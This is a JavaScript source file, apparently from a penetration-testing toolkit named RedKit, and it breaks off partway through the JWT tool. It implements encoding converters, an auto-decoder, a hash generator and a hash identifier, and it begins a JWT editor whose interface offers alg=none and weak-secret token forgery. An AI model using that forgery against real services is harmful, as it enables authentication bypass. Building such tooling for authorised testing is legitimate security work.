/* ============================================================
   RedKit - Crypto / encoding tools
   Loaded after js/core.js (uses $, el, TOOLS, helpers).
   ============================================================ */

// ============================================================
// CRYPTOGRAPHY TOOLS
// ============================================================

// ===== Two-pane transcoder (Google-Translate style: type left → result right, swap ⇄) =====
const transcoderTemplate = (id, opts = {}) => `
  <div class="tool">
    <div class="card">
      ${opts.typeSelect ? `<div class="tc-bar"><span class="tc-typelabel">Scheme</span>${opts.typeSelect}</div>` : ''}
      <div class="tc-panes">
        <div class="tc-pane">
          <div class="tc-head"><span class="tc-label" id="${id}-llabel">Text</span></div>
          <textarea id="${id}-src" class="tc-area" placeholder="type or paste…" autocomplete="off" spellcheck="false"></textarea>
        </div>
        <button class="tc-swap" id="${id}-swap" title="Swap direction"><i class="fas fa-right-left"></i></button>
        <div class="tc-pane">
          <div class="tc-head"><span class="tc-label" id="${id}-rlabel">—</span><button class="btn btn-ghost tc-copy" id="${id}-copy">Copy</button></div>
          <textarea id="${id}-dst" class="tc-area tc-out" readonly placeholder="result…" spellcheck="false"></textarea>
        </div>
      </div>
    </div>
  </div>
`;

// grow a textarea to fit its content (so long input/output expands the box
// downward instead of scrolling inside it); CSS min-height stays the floor.
const autosize = (el) => { el.style.height = 'auto'; el.style.height = el.scrollHeight + 'px'; };

const wireTranscoder = (id, getCodec) => {
  const src = $(`#${id}-src`), dst = $(`#${id}-dst`), ll = $(`#${id}-llabel`), rl = $(`#${id}-rlabel`);
  let dir = 'enc';   // 'enc' = left(Text) → right(encoded);  'dec' = left(encoded) → right(Text)
  const relabel = () => {
    const cl = getCodec().codeLabel;
    ll.textContent = dir === 'enc' ? 'Text' : cl;
    rl.textContent = dir === 'enc' ? cl : 'Text';
  };
  const convert = () => {
    const c = getCodec(), fn = dir === 'enc' ? c.enc : c.dec, input = src.value;
    if (input === '') { dst.value = ''; dst.classList.remove('tc-err'); }
    else {
      try { dst.value = fn(input) ?? ''; dst.classList.remove('tc-err'); }
      catch (e) { dst.value = '⚠ ' + (e.message || 'invalid input'); dst.classList.add('tc-err'); }
    }
    autosize(src); autosize(dst);
  };
  src.addEventListener('input', convert);
  $(`#${id}-swap`).addEventListener('click', () => {
    if (dst.value && !dst.classList.contains('tc-err')) src.value = dst.value;
    dir = dir === 'enc' ? 'dec' : 'enc';
    relabel(); convert();
  });
  $(`#${id}-copy`).addEventListener('click', () => copy(dst.value));
  const typeSel = $(`#${id}-type`);
  if (typeSel) typeSel.addEventListener('change', () => { relabel(); convert(); });
  relabel(); convert();
};

// ===== BASE32 (RFC 4648) =====
const B32_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
const base32Encode = (str) => {
  const bytes = new TextEncoder().encode(str);
  let bits = '';
  for (const b of bytes) bits += b.toString(2).padStart(8, '0');
  let out = '';
  for (let i = 0; i < bits.length; i += 5) {
    let chunk = bits.slice(i, i + 5);
    if (chunk.length < 5) chunk = chunk.padEnd(5, '0');
    out += B32_ALPHABET[parseInt(chunk, 2)];
  }
  while (out.length % 8) out += '=';
  return out;
};
const base32Decode = (str) => {
  str = str.toUpperCase().replace(/=+$/, '').replace(/\s/g, '');
  let bits = '';
  for (const c of str) {
    const idx = B32_ALPHABET.indexOf(c);
    if (idx === -1) throw new Error('Invalid base32 character: ' + c);
    bits += idx.toString(2).padStart(5, '0');
  }
  const bytes = [];
  for (let i = 0; i + 8 <= bits.length; i += 8) {
    bytes.push(parseInt(bits.slice(i, i + 8), 2));
  }
  return new TextDecoder().decode(new Uint8Array(bytes));
};

// ===== BASE58 (Bitcoin alphabet) =====
const B58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
const base58Encode = (str) => {
  const bytes = new TextEncoder().encode(str);
  if (!bytes.length) return '';
  let n = 0n;
  for (const b of bytes) n = n * 256n + BigInt(b);
  let out = '';
  while (n > 0n) {
    out = B58_ALPHABET[Number(n % 58n)] + out;
    n /= 58n;
  }
  // Preserve leading zero bytes as leading '1's
  for (const b of bytes) { if (b === 0) out = '1' + out; else break; }
  return out;
};
const base58Decode = (str) => {
  str = str.replace(/\s/g, '');
  if (!str) return '';
  let n = 0n;
  for (const c of str) {
    const idx = B58_ALPHABET.indexOf(c);
    if (idx === -1) throw new Error('Invalid base58 character: ' + c);
    n = n * 58n + BigInt(idx);
  }
  const bytes = [];
  while (n > 0n) {
    bytes.unshift(Number(n & 0xffn));
    n >>= 8n;
  }
  // Restore leading zero bytes
  for (const c of str) { if (c === '1') bytes.unshift(0); else break; }
  return new TextDecoder().decode(new Uint8Array(bytes));
};

// ===== BASE85 / ASCII85 =====
const base85Encode = (str) => {
  const bytes = new TextEncoder().encode(str);
  let out = '';
  for (let i = 0; i < bytes.length; i += 4) {
    const chunk = bytes.slice(i, i + 4);
    const padding = 4 - chunk.length;
    let n = 0;
    for (let j = 0; j < 4; j++) n = n * 256 + (chunk[j] || 0);
    if (n === 0 && padding === 0) { out += 'z'; continue; }
    let group = '';
    for (let j = 0; j < 5; j++) {
      group = String.fromCharCode((n % 85) + 33) + group;
      n = Math.floor(n / 85);
    }
    out += group.slice(0, 5 - padding);
  }
  return out;
};
const base85Decode = (str) => {
  str = str.replace(/\s/g, '').replace(/^<~|~>$/g, '');
  // expand z → !!!!!
  str = str.replace(/z/g, '!!!!!');
  const bytes = [];
  for (let i = 0; i < str.length; i += 5) {
    const chunk = str.slice(i, i + 5);
    const padding = 5 - chunk.length;
    let n = 0;
    for (let j = 0; j < 5; j++) {
      const c = j < chunk.length ? chunk.charCodeAt(j) : 'u'.charCodeAt(0);
      const v = c - 33;
      if (v < 0 || v > 84) throw new Error('Invalid base85 character');
      n = n * 85 + v;
    }
    for (let j = 3; j >= 0; j--) bytes.push((n >>> (j * 8)) & 0xff);
    for (let j = 0; j < padding; j++) bytes.pop();
  }
  return new TextDecoder().decode(new Uint8Array(bytes));
};

// ===== BINARY =====
const binaryEncode = (str) =>
  Array.from(new TextEncoder().encode(str))
    .map(b => b.toString(2).padStart(8, '0'))
    .join(' ');
const binaryDecode = (str) => {
  const bits = str.replace(/[^01]/g, '');
  if (bits.length % 8) throw new Error('Bit length not a multiple of 8');
  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) bytes.push(parseInt(bits.slice(i, i + 8), 2));
  return new TextDecoder().decode(new Uint8Array(bytes));
};

// ===== MORSE CODE =====
const MORSE = {
  A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',
  K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',
  U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',
  '0':'-----','1':'.----','2':'..---','3':'...--','4':'....-',
  '5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',
  '.':'.-.-.-',',':'--..--','?':'..--..',"'":'.----.','!':'-.-.--',
  '/':'-..-.','(':'-.--.',')':'-.--.-','&':'.-...',':':'---...',
  ';':'-.-.-.','=':'-...-','+':'.-.-.','-':'-....-','_':'..--.-',
  '"':'.-..-.','$':'...-..-','@':'.--.-.',
};
const MORSE_REV = Object.fromEntries(Object.entries(MORSE).map(([k, v]) => [v, k]));
const morseEncode = (s) =>
  s.toUpperCase().split('').map(c => {
    if (c === ' ') return '/';
    if (c === '\n') return '\n';
    return MORSE[c] || '';
  }).filter(Boolean).join(' ');
const morseDecode = (s) =>
  s.split(/(\s+)/).map(token => {
    if (/^\s+$/.test(token)) return token.includes('\n') ? '\n' : '';
    if (token === '/') return ' ';
    return MORSE_REV[token] || '';
  }).join('').replace(/\s+/g, ' ').trim();

// ===== Codec registry (shared by transcoder tools + Magic) =====
const b64Enc = s => btoa(unescape(encodeURIComponent(s)));
const b64Dec = s => decodeURIComponent(escape(atob(s.replace(/\s+/g, ''))));
const htmlEnc = escapeHtml; // same HTML-entity encoder, kept as an alias for the codec registry
const htmlDec = s => { const ta = document.createElement('textarea'); ta.innerHTML = s; return ta.value; };
const hexEnc = s => Array.from(new TextEncoder().encode(s)).map(b => b.toString(16).padStart(2, '0')).join('');
const hexDec = s => {
  const cleaned = s.replace(/[^0-9a-fA-F]/g, '');
  if (cleaned.length % 2) throw new Error('odd number of hex digits');
  const bytes = new Uint8Array(cleaned.length / 2);
  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(cleaned.substr(i * 2, 2), 16);
  return new TextDecoder().decode(bytes);
};

const CODECS = {
  base64: { codeLabel: 'Base64', enc: b64Enc, dec: b64Dec },
  base32: { codeLabel: 'Base32', enc: base32Encode, dec: base32Decode },
  base58: { codeLabel: 'Base58', enc: base58Encode, dec: base58Decode },
  base85: { codeLabel: 'Base85 / ASCII85', enc: base85Encode, dec: base85Decode },
  url:    { codeLabel: 'URL', enc: encodeURIComponent, dec: decodeURIComponent },
  html:   { codeLabel: 'HTML Entities', enc: htmlEnc, dec: htmlDec },
  hex:    { codeLabel: 'Hex', enc: hexEnc, dec: hexDec },
  binary: { codeLabel: 'Binary', enc: binaryEncode, dec: binaryDecode },
  morse:  { codeLabel: 'Morse', enc: morseEncode, dec: morseDecode },
};

// ----- Combined Base tool (Base64/32/58/85 in one) -----
const BASE_TYPES = [['base64', 'Base64'], ['base32', 'Base32'], ['base58', 'Base58'], ['base85', 'Base85 / ASCII85']];
TOOLS['base'] = {
  title: 'Base Encoding',
  desc: 'Encode and decode text across Base64, Base32, Base58, and Base85 in one place.',
  render: () => transcoderTemplate('base', {
    typeSelect: `<select id="base-type">${BASE_TYPES.map(([v, l]) => `<option value="${v}">${l}</option>`).join('')}</select>`,
  }),
  init: () => wireTranscoder('base', () => CODECS[$('#base-type').value] || CODECS.base64),
};

// ----- Single-scheme transcoder tools -----
TOOLS['url-encode']  = { title: 'URL Encode/Decode',  desc: 'Encode and decode URL percent-encoding as you type.',       render: () => transcoderTemplate('urlc'),  init: () => wireTranscoder('urlc', () => CODECS.url) };
TOOLS['html-encode'] = { title: 'HTML Encode/Decode', desc: 'Encode and decode HTML entities for safe markup and payloads.',           render: () => transcoderTemplate('htm'),   init: () => wireTranscoder('htm', () => CODECS.html) };
TOOLS['hex']         = { title: 'Hex Encode/Decode',  desc: 'Convert text to hexadecimal bytes and back.',       render: () => transcoderTemplate('hex'),   init: () => wireTranscoder('hex', () => CODECS.hex) };
TOOLS['binary']      = { title: 'Binary Encode/Decode', desc: 'Convert text to 8-bit binary and back.',          render: () => transcoderTemplate('bin'),   init: () => wireTranscoder('bin', () => CODECS.binary) };
TOOLS['morse']       = { title: 'Morse Code',         desc: 'Convert text to and from International Morse code.', render: () => transcoderTemplate('morse'), init: () => wireTranscoder('morse', () => CODECS.morse) };

// ===== MAGIC — auto-detect encoding(s), CyberChef-style =====
const rot13 = s => s.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - b + 13) % 26 + b); });
const printableScore = (s) => {
  const arr = [...s], n = arr.length;
  if (!n) return -1;
  let printable = 0, ctrl = 0, letters = 0, spaces = 0;
  for (const ch of arr) {
    const c = ch.codePointAt(0);
    if (c === 9 || c === 10 || c === 13) { printable++; spaces++; continue; }
    if (c < 32 || c === 127) { ctrl++; continue; }
    if (c < 127) { printable++; if ((c >= 65 && c <= 90) || (c >= 97 && c <= 122)) letters++; else if (c === 32) spaces++; }
    else if (c === 0xFFFD) { ctrl++; }       // replacement char → bad decode
    else printable += 0.7;
  }
  let score = printable / n - (ctrl / n) * 2;
  const low = s.toLowerCase();
  const words = ['the ', 'and ', 'for ', 'http', 'flag', 'www.', '://', 'password', 'admin', 'user', 'login', 'token', 'secret', 'https', 'select', 'union'];
  let hits = 0; for (const w of words) if (low.includes(w)) hits++;
  score += Math.min(hits, 4) * 0.08;
  if (/^https?:\/\//i.test(s.trim())) score += 0.25;
  if (/[a-z0-9_]+\{[^}]{2,}\}/i.test(s)) score += 0.4;   // flag{...}
  const sp = spaces / n; if (sp > 0.04 && sp < 0.25) score += 0.05;
  if (letters / n > 0.5) score += 0.05;
  return score;
};
const MAGIC_OPS = [
  { label: 'From Base64', test: s => { const t = s.replace(/\s+/g, ''); return /^[A-Za-z0-9+/]{8,}={0,2}$/.test(t) && t.length % 4 === 0; }, run: b64Dec },
  { label: 'From Hex',    test: s => { const t = s.replace(/\s+/g, ''); return /^[0-9a-fA-F]{4,}$/.test(t) && t.length % 2 === 0; }, run: hexDec },
  { label: 'From Base32', test: s => /^[A-Z2-7]{8,}=*$/i.test(s.replace(/\s+/g, '')), run: base32Decode },
  { label: 'From Binary', test: s => /^[01\s]{8,}$/.test(s) && s.replace(/[^01]/g, '').length % 8 === 0, run: binaryDecode },
  { label: 'URL Decode',  test: s => /%[0-9a-fA-F]{2}/.test(s), run: decodeURIComponent },
  { label: 'HTML Decode', test: s => /&(#\d+|#x[0-9a-fA-F]+|[a-zA-Z]+);/.test(s), run: htmlDec },
  { label: 'From Base58', test: s => /^[1-9A-HJ-NP-Za-km-z]{6,}$/.test(s.replace(/\s+/g, '')), run: base58Decode },
  { label: 'From Base85', test: s => { const t = s.replace(/\s+/g, ''); return /^[\x21-\x75]{5,}$/.test(t) && /[a-z]/i.test(t) && /[!-/:-@[-`]/.test(t); }, run: base85Decode },
  { label: 'From Morse',  test: s => /^[.\-/\s]{3,}$/.test(s) && /[.\-]/.test(s), run: morseDecode },
  { label: 'ROT13',       test: s => { const a = (s.match(/[a-z]/gi) || []).length; return a >= 3 && a / s.length > 0.6; }, run: rot13 },
];
const magicSearch = (input) => {
  const results = [], seen = new Set();
  const walk = (str, depth, chain) => {
    if (depth > 3 || results.length > 150) return;
    for (const op of MAGIC_OPS) {
      let out;
      try { if (!op.test(str)) continue; out = op.run(str); } catch (e) { continue; }
      if (out == null || out === '' || out === str || out.length > 50000) continue;
      const chain2 = [...chain, op.label];
      const key = chain2.join('>') + '|' + out.slice(0, 80);
      if (seen.has(key)) continue; seen.add(key);
      const score = printableScore(out);
      results.push({ chain: chain2, output: out, score, depth: chain2.length });
      if (score < 2.6) walk(out, depth + 1, chain2);
    }
  };
  walk(input, 1, []);
  results.sort((a, b) => b.score - a.score || a.depth - b.depth);
  const uniq = [], outs = new Set();
  for (const r of results) { const k = r.output.slice(0, 200); if (outs.has(k)) continue; outs.add(k); uniq.push(r); if (uniq.length >= 8) break; }
  return uniq;
};
TOOLS['magic'] = {
  title: 'Magic Encoding Detector',
  desc: 'Detect unknown encodings and decode them automatically, including nested layers.',
  render: () => `
    <div class="tool">
      <div class="card">
        <div class="card-title">Input</div>
        <div class="field">
          <label>Paste encoded / obfuscated data</label>
          <textarea id="magic-in" class="tc-area" placeholder="e.g. ZmxhZ3tyZWRraXRfbWFnaWN9" autocomplete="off" spellcheck="false"></textarea>
        </div>
      </div>
      <div class="card">
        <div class="result-header"><h4>Detected candidates</h4></div>
        <div id="magic-out"></div>
      </div>
    </div>`,
  init() {
    const box = $('#magic-out');
    const run = () => {
      const v = $('#magic-in').value.trim();
      if (!v) { box.innerHTML = '<div class="mg-empty">Waiting for input…</div>'; return; }
      const res = magicSearch(v);
      if (!res.length) { box.innerHTML = '<div class="mg-empty">No known encoding detected. Try the Base or Hex tools manually.</div>'; return; }
      box.innerHTML = res.map((r, i) => {
        const conf = Math.max(4, Math.min(100, Math.round(r.score * 55)));
        const out = escapeHtml(r.output.length > 600 ? r.output.slice(0, 600) + '…' : r.output);
        return `<div class="mg-cand${i === 0 ? ' mg-top' : ''}">
          <div class="mg-chain">${r.chain.map(c => `<span class="mg-op">${escapeHtml(c)}</span>`).join('<span class="mg-arr">→</span>')}
            <span class="mg-conf">${conf}% confidence</span>
            <button class="btn btn-ghost mg-copy" data-i="${i}">Copy</button></div>
          <pre class="not-pre mono mg-result">${out}</pre>
        </div>`;
      }).join('');
      $$('.mg-copy', box).forEach(b => b.addEventListener('click', () => copy(res[+b.dataset.i].output)));
    };
    let t; $('#magic-in').addEventListener('input', () => { clearTimeout(t); t = setTimeout(run, 160); });
    run();
  },
};

// ===== HASH GENERATOR =====
TOOLS['hash'] = {
  title: 'Hash Generator',
  desc: 'Generate MD5, SHA-1, SHA-256, SHA-512, and more from any input.',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Input</div>
          <div class="field">
            <textarea id="hash-input" placeholder="enter text..."></textarea>
          </div>
          <button class="btn" id="hash-gen">Generate Hashes</button>
        </div>
        <div class="card" id="hash-results" style="display:none">
          <div class="card-title">Hashes</div>
          <div id="hash-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    $('#hash-gen').addEventListener('click', () => {
      const txt = $('#hash-input').value;
      const algos = ['MD5', 'SHA1', 'SHA224', 'SHA256', 'SHA384', 'SHA512', 'SHA3', 'RIPEMD160'];
      const out = $('#hash-output');
      out.innerHTML = '';
      algos.forEach(a => {
        try {
          const h = CryptoJS[a](txt).toString();
          const row = el('div', { class: 'header-row' });
          row.innerHTML = `<span class="h-name">${a}</span><span class="h-detail mono" style="font-family:'JetBrains Mono',monospace;color:var(--text)">${escapeHtml(h)}</span>`;
          const btn = el('button', { class: 'btn btn-ghost', onclick: () => copy(h) }, 'Copy');
          row.appendChild(btn);
          out.appendChild(row);
        } catch {}
      });
      $('#hash-results').style.display = 'block';
    });
  }
};

// ===== HASH IDENTIFIER =====
TOOLS['hash-id'] = {
  title: 'Hash Identifier',
  desc: 'Identify an unknown hash by its length, character set, and format.',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Hash</div>
          <div class="field">
            <textarea id="hid-input" rows="3" placeholder="paste hash here (e.g. 5d41402abc4b2a76b9719d911017c592)"></textarea>
          </div>
          <div class="btn-row">
            <button class="btn" id="hid-id">Identify</button>
            <button class="btn btn-secondary" id="hid-clear">Clear</button>
          </div>
        </div>
        <div class="card" id="hid-results" style="display:none">
          <div class="card-title">Hash Information</div>
          <dl class="info-grid" id="hid-info"></dl>
          <div class="rec-section-label" style="margin-top:18px">Possible Hash Types</div>
          <div class="payload-list" id="hid-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    // ===== Comprehensive hash signature database =====
    // hex(n)  → exactly n hex chars
    // re      → custom regex
    // likely  → most probable interpretation for that length
    const hex = (n) => new RegExp(`^[a-f0-9]{${n}}$`, 'i');
    const SIGS = [
      // ----- 4 -----
      { re: hex(4),  name: 'CRC-16' },
      { re: hex(4),  name: 'CRC-16-CCITT' },
      { re: hex(4),  name: 'FCS-16' },

      // ----- 8 -----
      { re: hex(8),  name: 'CRC-32', likely: true },
      { re: hex(8),  name: 'CRC-32B' },
      { re: hex(8),  name: 'Adler-32' },
      { re: hex(8),  name: 'XOR-32' },
      { re: hex(8),  name: 'FCS-32' },
      { re: hex(8),  name: 'GHash-32-3' },
      { re: hex(8),  name: 'GHash-32-5' },

      // ----- 13 -----
      { re: /^[./0-9A-Za-z]{13}$/, name: 'DES (Unix)', likely: true },
      { re: /^[./0-9A-Za-z]{13}$/, name: 'Traditional DES' },

      // ----- 16 -----
      { re: hex(16), name: 'MySQL323', likely: true },
      { re: hex(16), name: 'DES (Oracle)' },
      { re: hex(16), name: 'Half MD5' },
      { re: hex(16), name: 'Oracle 7-10g' },
      { re: hex(16), name: 'CRC-64' },

      // ----- 32 -----
      { re: hex(32), name: 'MD5', likely: true },
      { re: hex(32), name: 'NTLM', likely: true },
      { re: hex(32), name: 'MD4' },
      { re: hex(32), name: 'MD2' },
      { re: hex(32), name: 'LM' },
      { re: hex(32), name: 'RIPEMD-128' },
      { re: hex(32), name: 'Haval-128' },
      { re: hex(32), name: 'Tiger-128' },
      { re: hex(32), name: 'Snefru-128' },
      { re: hex(32), name: 'Skein-256(128)' },
      { re: hex(32), name: 'Skein-512(128)' },
      { re: hex(32), name: 'Lotus Notes/Domino 5' },
      { re: hex(32), name: 'Skype' },
      { re: hex(32), name: 'ZipMonster' },
      { re: hex(32), name: 'PrestaShop' },
      { re: hex(32), name: 'md5(md5($pass))' },
      { re: hex(32), name: 'md5($pass.$salt)' },
      { re: hex(32), name: 'md5($salt.$pass)' },

      // ----- 40 -----
      { re: hex(40), name: 'SHA-1', likely: true },
      { re: hex(40), name: 'MySQL5.x', likely: true },
      { re: hex(40), name: 'RIPEMD-160' },
      { re: hex(40), name: 'Haval-160' },
      { re: hex(40), name: 'Tiger-160' },
      { re: hex(40), name: 'HAS-160' },
      { re: hex(40), name: 'LinkedIn' },
      { re: hex(40), name: 'Skein-256(160)' },
      { re: hex(40), name: 'Skein-512(160)' },
      { re: hex(40), name: 'sha1($pass.$salt)' },
      { re: hex(40), name: 'sha1($salt.$pass)' },

      // ----- 48 -----
      { re: hex(48), name: 'Tiger-192', likely: true },
      { re: hex(48), name: 'Haval-192' },
      { re: hex(48), name: 'OSX v10.4 - v10.6' },

      // ----- 56 -----
      { re: hex(56), name: 'SHA-224', likely: true },
      { re: hex(56), name: 'SHA3-224' },
      { re: hex(56), name: 'Haval-224' },
      { re: hex(56), name: 'Skein-256(224)' },
      { re: hex(56), name: 'Skein-512(224)' },

      // ----- 64 -----
      { re: hex(64), name: 'SHA-256', likely: true },
      { re: hex(64), name: 'SHA3-256' },
      { re: hex(64), name: 'BLAKE2s-256' },
      { re: hex(64), name: 'Haval-256' },
      { re: hex(64), name: 'GOST R 34.11-94' },
      { re: hex(64), name: 'GOST CryptoPro S-Box' },
      { re: hex(64), name: 'Skein-256' },
      { re: hex(64), name: 'Skein-512(256)' },
      { re: hex(64), name: 'Ventrilo' },

      // ----- 80 -----
      { re: hex(80), name: 'RIPEMD-320' },
      { re: hex(80), name: 'Haval-320' },

      // ----- 96 -----
      { re: hex(96), name: 'SHA-384', likely: true },
      { re: hex(96), name: 'SHA3-384' },
      { re: hex(96), name: 'Skein-512(384)' },
      { re: hex(96), name: 'Skein-1024(384)' },

      // ----- 128 -----
      { re: hex(128), name: 'SHA-512', likely: true },
      { re: hex(128), name: 'SHA3-512' },
      { re: hex(128), name: 'BLAKE2b-512' },
      { re: hex(128), name: 'Whirlpool' },
      { re: hex(128), name: 'Skein-512' },
      { re: hex(128), name: 'Skein-1024(512)' },
      { re: hex(128), name: 'Salsa10' },
      { re: hex(128), name: 'Salsa20' },

      // ----- 136 -----
      { re: hex(136), name: 'OSX v10.7' },

      // ----- 256 -----
      { re: hex(256), name: 'Skein-1024' },

      // ----- Format-prefixed (most reliable) -----
      { re: /^\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$/, name: 'MD5 Crypt', likely: true },
      { re: /^\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$/, name: 'Apache MD5 (apr1)', likely: true },
      { re: /^\$2[abxy]?\$\d{2}\$[./A-Za-z0-9]{53}$/, name: 'bcrypt', likely: true },
      { re: /^\$5\$(rounds=\d+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{43}$/, name: 'SHA-256 Crypt', likely: true },
      { re: /^\$6\$(rounds=\d+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$/, name: 'SHA-512 Crypt', likely: true },
      { re: /^\$argon2i\$/, name: 'Argon2i', likely: true },
      { re: /^\$argon2d\$/, name: 'Argon2d', likely: true },
      { re: /^\$argon2id\$/, name: 'Argon2id', likely: true },
      { re: /^\$pbkdf2-sha\d+\$/, name: 'PBKDF2', likely: true },
      { re: /^\$y\$/, name: 'yescrypt', likely: true },
      { re: /^\$7\$/, name: 'scrypt', likely: true },
      { re: /^\$P\$[./A-Za-z0-9]{31}$/, name: 'phpass (Wordpress / phpBB3)', likely: true },
      { re: /^\$H\$[./A-Za-z0-9]{31}$/, name: 'phpass (Wordpress)', likely: true },
      { re: /^\{SHA\}/, name: 'LDAP {SHA}', likely: true },
      { re: /^\{SSHA\}/, name: 'LDAP {SSHA}', likely: true },
      { re: /^\{MD5\}/, name: 'LDAP {MD5}', likely: true },
      { re: /^\{SMD5\}/, name: 'LDAP {SMD5}', likely: true },
      { re: /^0x0100[a-f0-9]+$/i, name: 'MSSQL (2005/2008/2012)', likely: true },
      { re: /^\*[A-F0-9]{40}$/i, name: 'MySQL 4.1+', likely: true },
      { re: /^[a-f0-9]{32}:[a-f0-9]+$/i, name: 'md5($pass.$salt) - salted', likely: true },
      { re: /^[a-f0-9]{40}:[a-f0-9]+$/i, name: 'sha1($pass.$salt) - salted', likely: true },
      { re: /^[A-Z0-9]{32}:[A-Z0-9]{32}$/i, name: 'LM:NTLM combo' },

      // ----- Base64-encoded common hashes -----
      { re: /^[A-Za-z0-9+/]{27}=$/, name: 'Base64 MD5 (binary)' },
      { re: /^[A-Za-z0-9+/]{43}=$/, name: 'Base64 SHA-256 (binary)' },
      { re: /^[A-Za-z0-9+/]{86}==$/, name: 'Base64 SHA-512 (binary)' },
    ];

    const identify = () => {
      const v = $('#hid-input').value.trim();
      if (!v) return toast('Enter a hash');

      const info = $('#hid-info');
      info.innerHTML = '';
      const charset =
        /^[a-f0-9]+$/i.test(v) ? 'Hexadecimal (a-f, 0-9)' :
        /^[A-Za-z0-9+/=]+$/.test(v) ? 'Base64 (A-Z, a-z, 0-9, +/=)' :
        /^[A-Za-z0-9._/$=-]+$/.test(v) ? 'Mixed (likely formatted hash)' :
        'Custom / unknown';
      const fields = {
        'Length': `${v.length} characters`,
        'Character set': charset,
        'Lowercase only': /^[^A-Z]*$/.test(v) ? 'Yes' : 'No',
        'Uppercase only': /^[^a-z]*$/.test(v) ? 'Yes' : 'No',
      };
      Object.entries(fields).forEach(([k, val]) => {
        info.innerHTML += `<dt>${k}</dt><dd>${escapeHtml(val)}</dd>`;
      });

      const matches = SIGS.filter(s => s.re.test(v));
      matches.sort((a, b) => (b.likely ? 1 : 0) - (a.likely ? 1 : 0));

      const out = $('#hid-output');
      out.innerHTML = '';
      if (matches.length === 0) {
        out.innerHTML = `<div class="payload-item" style="color:var(--text-mute)"><code>No known hash type matches this format.</code></div>`;
      } else {
        matches.forEach(m => {
          const item = el('div', { class: 'payload-item' });
          item.innerHTML = `
            <code>${escapeHtml(m.name)}</code>
            ${m.likely ? '<span class="severity-badge sev-low" style="font-size:9px">MOST LIKELY</span>' : ''}
          `;
          out.appendChild(item);
        });
      }
      $('#hid-results').style.display = 'block';
    };

    $('#hid-id').addEventListener('click', identify);
    $('#hid-input').addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); identify(); }
    });
    $('#hid-clear').addEventListener('click', () => {
      $('#hid-input').value = '';
      $('#hid-results').style.display = 'none';
    });
  }
};

// ===== JWT DECODER =====
TOOLS['jwt'] = {
  title: 'JWT Decoder / Editor',
  desc: 'Decode, edit, and re-sign JSON Web Tokens, including alg none and weak-secret attacks.',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">JWT Token</div>
          <div class="field">
            <textarea id="jwt-input" rows="4" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
          </div>
          <div class="btn-row">
            <button class="btn" id="jwt-decode">Decode &amp; Edit</button>
          </div>
        </div>

        <div class="card" id="jwt-results" style="display:none">
          <div class="card-title">Decoded</div>
          <div id="jwt-output"></div>
        </div>

        <div class="card" id="jwt-editor" style="display:none">
          <div class="card-title">Edit &amp; Re-sign Token</div>
          <p style="color:var(--text-mute);font-size:12px;margin-bottom:12px">Modify the header or payload below, then rebuild a new token. Use <strong>alg=none</strong> to test missing-signature bugs, or <strong>HS256</strong> with a guessed secret to forge a valid token.</p>
          <div class="field">
            <label>Header (JSON)</label>
            <textarea id="jwt-edit-header" rows="4" class="mono"></textarea>
          </div>
          <div class="field">
            <label>Payload (JSON)</label>
            <textarea id="jwt-edit-payload" rows="6" class="mono"></textarea>
          </div>
          <div class="field-row">
            <div class="field">
              <label>Signing</label>
              <select id="jwt-sign-alg">
                <option value="none">alg=none (no signature)</option>
                <option value="HS256">HS256 (HMAC-SHA256)</option>
                <option value="HS384">HS384 (HMAC-SHA384)</option>
                <option value="HS512">HS512 (HMAC-SHA512)</option>
                <option value="keep">Keep original signature</option>
              </select>
            </div>
            <div class="field">
              <label>Secret (HMAC only)</label>
              <input type="text" id="jwt-secret" placeholder="secret / leak / weak-key">
            </div>
          </div>
          <div class="btn-row">
            <button class="btn" id="jwt-rebuild">Rebuild Token</button>
            <button class="btn btn-secondary" id="jwt-crack">Try Common Secrets</button>
          </div>
          <div class="field" style="margin-top:12px">
            <label>New Token</label>
            <textarea id="jwt-output-token" rows="4" class="mono" readonly></textarea>
          </div>
          <div class="btn-row">
            <button class="btn btn-ghost" id="jwt-copy-new">Copy</button>
          </div>
          <div id="jwt-edit-status" style="margin-top:8px;font-size:12px;color:var(--text-mute)"></div>
        </div>
      </div>
    `;
  },
  init() {
    // ===== Base64url helpers =====
    const b64uDecode = (s) => {
      const norm = s.replace(/-/g, '+').replace(/_/g, '/');
      const pad = norm + '='.repeat((4 - norm.length % 4) % 4);
      return atob(pad);
    };
    const b64uEncode = (s) => btoa(s).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    const b64uEncodeBytes = (bytes) => {
      let bin = '';
      for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
      return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    };

    // ===== HMAC sign with Web Crypto =====
    const hmacSign = async (data, secret, hash) => {
      const enc = new TextEncoder();
      const key = await crypto.subtle.importKey('raw', enc.encode(secret), { name: 'HMAC', hash }, false, ['sign']);
      const sig = await crypto.subtle.sign('HMAC', key, enc.encode(data));
      return new Uint8Array(sig);
    };

    const hashMap = { HS256: 'SHA-256', HS384: 'SHA-384', HS512: 'SHA-512' };

